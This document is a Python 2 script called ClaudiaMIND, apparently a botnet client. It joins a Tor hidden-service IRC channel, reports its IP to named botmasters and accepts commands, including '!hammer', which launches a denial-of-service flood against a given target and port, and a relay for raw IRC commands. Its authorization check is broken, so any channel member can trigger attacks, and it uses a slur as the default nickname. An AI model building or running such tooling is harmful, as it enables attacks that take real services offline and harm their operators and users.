#!/usr/bin/env python2
import re
import claudiashammer
import requests
import socks
import socket
import ssl
import time
import requests
import lxml
import subprocess
import random
import thread
import threading
import os
import string
from Queue import Queue
from bs4 import BeautifulSoup

# Aesthetics

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

art = """
  ____ _                 _ _       __  __ ___ _   _ ____  
 / ___| | __ _ _   _  __| (_) __ _|  \/  |_ _| \ | |  _ \ 
| |   | |/ _` | | | |/ _` | |/ _` | |\/| || ||  \| | | | |
| |___| | (_| | |_| | (_| | | (_| | |  | || || |\  | |_| |
 \____|_|\__,_|\__,_|\__,_|_|\__,_|_|  |_|___|_| \_|____/ 
                                                          
                                  1337 Tor hivemind                       
"""

global target
global threads
global port
target = None
threads = None
port = None

# Classes & Threading

class hammer(threading.Thread):
    def run(self):
        claudiashammer.main(target, int(threads), int(port), False)

print(bcolors.OKBLUE + art + bcolors.ENDC)
time.sleep(1)

version = "0.1.0"

print(bcolors.HEADER + "~~ Built up on TorBot. Special thanks to Leet for this awesome code which is so easy to work with. <33333" + bcolors.ENDC)
print(bcolors.OKBLUE + "v" + version + " see: https://github.com/ClaudiaDAnon/ClaudiaMIND" + bcolors.ENDC)

sport = raw_input("SOCKS5 port (def. 9050): ")
if sport == "":
    sport = 9050

native_ip = "0"

if native_ip == "0":
    print(bcolors.WARNING + "You might want to set your native IP inside the file in order to make this process shorter." + bcolors.ENDC)
    time.sleep(2)
native_ip = requests.get("http://canihazip.com/s").text

print("Your native IP: " + native_ip)


# Tor
socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", sport, True)
socket.socket = socks.socksocket
s = socks.socksocket()



IP = requests.get("http://canihazip.com/s").text
if IP == native_ip:
    IP = 0
    print(bcolors.FAIL + "Detected IP leaks." + bcolors.ENDC)
    time.sleep(2)
else:
    print(bcolors.OKGREEN + "No IP leaks detected." + bcolors.ENDC)
    time.sleep(1)

print(bcolors.OKBLUE + "IP: " + IP + bcolors.ENDC)

# Setting nicknames and realnames

nickname = "" # SET THIS VALUE TO YOUR NICKNAME
if nickname ==  "":
    nickname = "faggot" + str(int(random.random() * 1000))
print("If you want a better nickname than " + bcolors.FAIL + nickname + bcolors.ENDC + ", then set it inside the file.")
username = nickname
realname = nickname
ircd = "3ieus5zeidnhs35p.onion"
ircport = 1337

botmaster = "ClaudiaD"
masterbot = "ClaudiaBOT"
admins = ['Case', 'ODB']

channel = "#claudiamind"

password = ""

try:
    
    s.connect((ircd, ircport))
    s = ssl.wrap_socket(s)
    
except Exception as e:
    print(bcolors.FAIL + "Failed to connect. Is TOR running? [" + str(sport) + "]" + bcolors.ENDC)
    print(e)
    exit()

#s.send("PASS " + password + "\r\n")    
s.send("NICK " + nickname + "\r\n")
s.send("USER " + username + " 0 * :" + realname + "\r\n")


# Message-sending 
def message(msg):
    s.send("PRIVMSG " + channel + " :" + msg + "\r\n")

# Private-Messaging
def privmessage(user2, msg):
    s.send(":source PRIVMSG " + user2 + " :" + msg + "\r\n")

    
# Wait for ping from server

connected = 0
while connected == 0:
    recvd = s.recv(4096)
    if "PING :" in recvd:
        recvd = recvd.strip("PING :")
        #print "DEBUG: " + recvd
        pong = "PONG :" + recvd
        s.send(pong)
    
    if nickname + "!" + username in recvd:
        connected = 1

# Message the authorities and join channel

s.send("PRIVMSG " + botmaster + " :" + IP + " @" + version + "\r\n") # sends only your Tor IP
s.send("PRIVMSG " + masterbot + " :" + IP + " @" + version + "\r\n")
for admin in admins:
    s.send("PRIVMSG " + admin + " :" + IP + " @" + version + "\r\n")
time.sleep(2)
#s.send(":source PRIVMSG nickserv :IDENTIFY "+ password + "\r\n")
s.send(":source JOIN :" + channel + "\r\n")
s.send(":source PRIVMSG " + channel + " :Ahoy, pirate ~" + nickname + "~ has joined the battle.\r\n")

# Loop to receive input and execute commands        

def take_input(chan, s):
    while 1:
        data = raw_input()
        send_data = (":source PRIVMSG " + channel + " :" + data + "\r\n")
        s.send(send_data)
        
q = Queue()

thread.start_new_thread(take_input, (channel,s,))

free_for_all = 0 # Freemode off, only authorized people can issue commands
allowed = 0
    
while 1:
    recvd = s.recv(1024)
    msg = string.split(recvd)[3:]
    sentmessage = " ".join(msg)[1:]
    
    #userfinding 
    recvdfix = recvd.strip("\r\n")
    senderuser = recvdfix.split(" ")
    senderuser = senderuser[0].split("!")
    senderuser = senderuser[0].strip(":")
    


    print "recvd: " + recvd
    #print "<%r> %r" % (senderuser, sentmessage)
    print bcolors.OKBLUE + "<" + senderuser + "> " + bcolors.ENDC + sentmessage 
    if "PING :" in recvd:
        recvd = recvd.strip("PING :")
        pong = "PONG : " + recvd
        s.send(pong)       
        
        #check for commands only authorized people can give
    
    if (senderuser == botmaster or masterbot) or senderuser in admins:
        auth = senderuser
        allowed = 1

    if free_for_all == 1:
        allowed = 1
            
     
    # execute any commands detected from authorised people
    
    if allowed == 1:
        if sentmessage == "!test":
            time.sleep(1)
            message("Testing: v" + version)
            s.send("PRIVMSG " + senderuser + " :" + IP + " @" + version + "\r\n")
        if "!hammer" in sentmessage:
            if target is None:
                attackdata = sentmessage.replace("!hammer ", "")
                try:
                    attackspecs = re.findall(r'(.*?) (.*?) (.*)', attackdata)
                    target, threads, port = attackspecs[0]
                    time.sleep(2)
                    threads = int(threads)
                    port = int(port)
                    attack_hammer = hammer()
                    hammer.start(attack_hammer)
                except Exception as e:
                    print(bcolors.FAIL + "Incorrect !hammer format." + bcolors.ENDC)
                    message("Incorrect !hammer format.")
                    print(e)
        if "!command" in sentmessage:
            try:
                commanddata = sentmessage.replace("!command ", "")
                result = re.findall(r'(.*?) (.*)', commanddata)
                if result[0][0] == nickname or "*":
                    s.send(result[0][1] + "\r\n")
            except Exception as e:
                print(bcolors.FAIL + "Incorrect !command format." + bcolors.ENDC)
                message("Incorrect !command format.")
                print(e)
        if sentmessage == "!stop":
            claudiashammer.stop_now = True
            message("Stopping the attack")
            target = None
            threads = None
            port = None
